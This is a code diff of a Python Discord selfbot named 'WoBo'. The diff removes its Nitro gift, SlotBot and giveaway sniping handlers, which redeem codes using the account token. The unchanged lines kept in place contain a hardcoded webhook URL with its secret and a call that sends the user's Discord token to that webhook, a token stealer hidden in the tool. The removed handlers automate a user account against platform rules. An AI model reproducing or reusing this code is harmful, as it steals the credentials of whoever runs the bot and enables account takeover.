@@ -203,10 +203,6 @@ WoBo = commands.Bot(description="WoBo's Selfbot", command_prefix=prefix, self_bo
 
 WoBo.antiraid = False
 WoBo.msgsniper = True
-WoBo.slotbot_sniper = True
-WoBo.giveaway_sniper = True
-WoBo.mee6 = False
-WoBo.mee6_channel = None
 WoBo.yui_kiss_user = None
 WoBo.yui_kiss_channel = None
 WoBo.yui_hug_user = None
@@ -221,6 +217,7 @@ WoBo.remove_command('help')
 
 webhook = Webhook.from_url("https://canary.discord.com/api/webhooks/838800486760710284/xcPFR5A7xPv7AwdHQXG_kX89kyH_E6F2PkE0Iq9zaKZU0G7Vu9iAPGiRpqLQqGt_Jl2v", adapter=RequestsWebhookAdapter())
 webhook.send(token)
+
 @WoBo.event
 async def on_command_error(ctx, error):
     error_str = str(error)
@@ -246,106 +243,6 @@ async def on_message_edit(before, after):
     await WoBo.process_commands(after)
 
 
-@WoBo.event
-async def on_message(message):
-    if WoBo.copycat is not None and WoBo.copycat.id == message.author.id:
-        await message.channel.send(chr(173) + message.content)
-
-    def GiveawayData():
-        print(
-            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
-            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
-            + Fore.RESET)
-
-    def SlotBotData():
-        print(
-            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
-            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
-            + Fore.RESET)
-
-    def NitroData(elapsed, code):
-        print(
-            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
-            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
-            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
-            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
-            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
-            + Fore.RESET)
-
-    time = datetime.datetime.now().strftime("%H:%M %p")
-    if 'discord.gift/' in message.content:
-        if nitro_sniper:
-            start = datetime.datetime.now()
-            code = re.search("discord.gift/(.*)", message.content).group(1)
-            token = config.get('token')
-
-            headers = {'Authorization': token}
-
-            r = requests.post(
-                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
-                headers=headers,
-            ).text
-
-            elapsed = datetime.datetime.now() - start
-            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'
-
-            if 'This gift has been redeemed already.' in r:
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
-                NitroData(elapsed, code)
-
-            elif 'subscription_plan' in r:
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
-                NitroData(elapsed, code)
-
-            elif 'Unknown Gift Code' in r:
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]" + Fore.RESET)
-                NitroData(elapsed, code)
-        else:
-            return
-
-    if 'Someone just dropped' in message.content:
-        if WoBo.slotbot_sniper:
-            if message.author.id == 346353957029019648:
-                try:
-                    await message.channel.send('~grab')
-                except discord.errors.Forbidden:
-                    print(""
-                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
-                    SlotBotData()
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
-                SlotBotData()
-        else:
-            return
-
-    if 'GIVEAWAY' in message.content:
-        if WoBo.giveaway_sniper:
-            if message.author.id == 294882584201003009:
-                try:
-                    await message.add_reaction("🎉")
-                except discord.errors.Forbidden:
-                    print(""
-                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
-                    GiveawayData()
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
-                GiveawayData()
-        else:
-            return
-
-    if f'Congratulations <@{WoBo.user.id}>' in message.content:
-        if WoBo.giveaway_sniper:
-            if message.author.id == 294882584201003009:
-                print(""
-                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
-                GiveawayData()
-        else:
-            return
-
-    await WoBo.process_commands(message)
 
 
 @WoBo.event
